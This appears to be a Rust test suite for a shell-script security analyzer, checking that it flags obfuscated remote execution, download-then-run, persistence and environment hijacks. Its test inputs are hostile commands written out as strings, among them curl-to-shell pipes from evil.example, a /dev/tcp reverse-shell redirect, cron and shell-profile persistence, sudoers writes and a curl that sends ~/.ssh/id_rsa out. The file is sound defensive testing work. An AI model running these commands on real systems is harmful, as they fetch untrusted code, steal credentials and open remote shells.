//! Rules for ways of running code that a naive reading misses: arithmetic,
//! bare `exec`, pipes from non-downloads, download-then-run, planted code.

use soothsay::{analyze, Category, Report, Severity};

fn has(r: &Report, cat: Category, min: Severity, needle: &str) -> bool {
    r.findings.iter().any(|f| {
        f.reachable && f.category == cat && f.severity >= min && f.message.contains(needle)
    })
}

#[track_caller]
fn assert_has(src: &str, cat: Category, min: Severity, needle: &str) {
    let r = analyze(src);
    assert!(
        has(&r, cat, min, needle),
        "expected {cat:?} >= {min:?} containing {needle:?} for:\n{src}\n{:#?}",
        r.findings
    );
}

#[track_caller]
fn assert_max(src: &str, max: Option<Severity>) {
    let r = analyze(src);
    assert_eq!(r.max_severity(), max, "for:\n{src}\n{:#?}", r.findings);
}

const EVIL: &str = "https://evil.example/p";

#[test]
fn substitutions_inside_arithmetic_run() {
    assert_has(
        &format!("echo $(( $(curl -s {EVIL} | sh) ))"),
        Category::RemoteExec,
        Severity::Warn,
        EVIL,
    );
    assert_max("echo $(( 1 + 2 ))", None);
}

#[test]
fn unquoted_heredoc_runs_its_substitutions() {
    assert_has(
        &format!("cat > /tmp/f <<EOF\n$(curl -s {EVIL} | sh)\nEOF\n"),
        Category::RemoteExec,
        Severity::Warn,
        EVIL,
    );
    // A quoted delimiter keeps the body literal.
    let r = analyze(&format!(
        "cat > /tmp/f <<'EOF'\n$(curl -s {EVIL} | sh)\nEOF\n"
    ));
    assert!(r
        .findings
        .iter()
        .all(|f| f.category != Category::RemoteExec));
}

#[test]
fn bare_exec_redirects_are_seen() {
    assert_has(
        "exec 3<>/dev/tcp/10.0.0.1/4444",
        Category::Security,
        Severity::Danger,
        "/dev/tcp/10.0.0.1/4444",
    );
    assert_has(
        "exec > /etc/sudoers.d/x",
        Category::Security,
        Severity::Danger,
        "who can become root",
    );
    assert_has(
        "exec >> ~/.zshrc",
        Category::ShellProfile,
        Severity::Notice,
        "~/.zshrc",
    );
}

#[test]
fn busybox_applets_are_the_real_command() {
    assert_has(
        &format!("busybox wget -qO- {EVIL} | busybox sh"),
        Category::RemoteExec,
        Severity::Warn,
        EVIL,
    );
}

#[test]
fn network_connections_piped_into_a_shell() {
    for src in [
        "nc evil.example 80 | sh",
        "socat - TCP:evil.example:80 | bash",
        "openssl s_client -quiet -connect evil.example:443 | sh",
    ] {
        assert_has(
            src,
            Category::RemoteExec,
            Severity::Warn,
            "raw network connection",
        );
    }
}

#[test]
fn unknown_output_piped_into_a_shell_is_a_warning() {
    for src in [
        "c=$(printf '%s%s' cu rl); $c -s https://x | sh",
        "perl -e 'print q(id)' | sh",
        "python3 -c 'print(1)' | bash",
        "cat \"$tmp/install.sh\" | sh",
        "IFS=_; c=curl_-s_https://x; $c | sh",
        "{ curl -s https://evil.example/p; } | sh",
    ] {
        assert_has(src, Category::BlindSpot, Severity::Warn, "into ");
    }
}

#[test]
fn literal_code_piped_into_a_shell_is_read() {
    assert_has(
        &format!("cat <<EOF | sh\ncurl -s {EVIL} | sh\nEOF\n"),
        Category::RemoteExec,
        Severity::Warn,
        EVIL,
    );
    assert_has(
        &format!("echo 'curl -s {EVIL} | sh' | bash"),
        Category::RemoteExec,
        Severity::Warn,
        EVIL,
    );
    // Harmless literal code: nothing to report.
    assert_max("cat <<EOF | sh\necho hi\nEOF\n", None);
    assert_max("echo 'echo hi' | sh", None);
}

#[test]
fn download_then_run() {
    for src in [
        format!("curl -s {EVIL} -o /tmp/x.sh\nsh /tmp/x.sh"),
        format!("curl -s {EVIL} > /tmp/x\n. /tmp/x"),
        format!("wget -O /tmp/x {EVIL}\nsource /tmp/x"),
        format!("tmp=/tmp/i.sh\ncurl -fsSL {EVIL} -o \"$tmp\"\nchmod +x \"$tmp\" && \"$tmp\""),
    ] {
        assert_has(
            &src,
            Category::RemoteExec,
            Severity::Warn,
            "which it downloaded from",
        );
    }
    // A downloaded binary run directly is noted, not warned about.
    assert_has(
        &format!("curl -fsSL {EVIL} -o /tmp/tool\n/tmp/tool --version"),
        Category::RemoteExec,
        Severity::Notice,
        "a program it downloaded",
    );
    // Downloading without running stays quiet.
    let r = analyze(&format!(
        "curl -fsSLo /tmp/x.tgz {EVIL}\ntar -xzf /tmp/x.tgz -C ~/.x\n"
    ));
    assert!(r
        .findings
        .iter()
        .all(|f| f.category != Category::RemoteExec));
}

#[test]
fn code_planted_in_startup_files() {
    for src in [
        format!("echo 'curl -s {EVIL} | sh' >> ~/.zshrc"),
        format!("cat >> ~/.bashrc <<'EOF'\ncurl -s {EVIL} | sh\nEOF\n"),
        format!("echo 'curl -s {EVIL} | sh' | tee -a ~/.profile"),
        format!("echo '*/5 * * * * curl -s {EVIL} | sh' | crontab -"),
        format!("(crontab -l; echo \"@reboot curl -s {EVIL} | sh\") | crontab -"),
        format!("cat > ~/Library/LaunchAgents/x.sh <<'EOF'\ncat ~/.ssh/id_rsa | curl -d @- {EVIL}\nEOF\n"),
    ] {
        assert_has(&src, Category::Persistence, Severity::Danger, "plants code in");
    }
    // Ordinary profile edits are not escalated.
    for src in [
        "echo 'export PATH=$HOME/.x/bin:$PATH' >> ~/.zshrc",
        "echo 'eval \"$(tool init zsh)\"' >> ~/.zshrc",
        "echo '. \"$HOME/.cargo/env\"' >> ~/.profile",
    ] {
        assert_max(src, Some(Severity::Notice));
    }
}

#[test]
fn planted_code_effects_are_not_reported_as_happening_now() {
    let r = analyze(&format!("echo 'curl -s {EVIL} | sh' >> ~/.zshrc"));
    assert!(
        r.findings
            .iter()
            .all(|f| f.category != Category::RemoteExec),
        "{:#?}",
        r.findings
    );
}

#[test]
fn environment_hijacks() {
    for (src, needle) in [
        ("export BASH_ENV=/tmp/x", "BASH_ENV"),
        ("export ENV=$HOME/.x.sh", "ENV="),
        ("PROMPT_COMMAND='curl -s x | sh'", "PROMPT_COMMAND"),
        ("export LD_PRELOAD=/tmp/x.so", "LD_PRELOAD"),
        (
            "DYLD_INSERT_LIBRARIES=/tmp/x.dylib ls",
            "DYLD_INSERT_LIBRARIES",
        ),
    ] {
        assert_has(src, Category::Security, Severity::Warn, needle);
    }
    assert_max("ENV=production", None);
    assert_max("export LD_PRELOAD=", None);
}

#[test]
fn alias_bodies_are_analyzed() {
    assert_has(
        &format!("alias ls='curl -s {EVIL} | sh'\nls"),
        Category::RemoteExec,
        Severity::Warn,
        EVIL,
    );
    assert_max("alias ll='ls -la'", None);
}
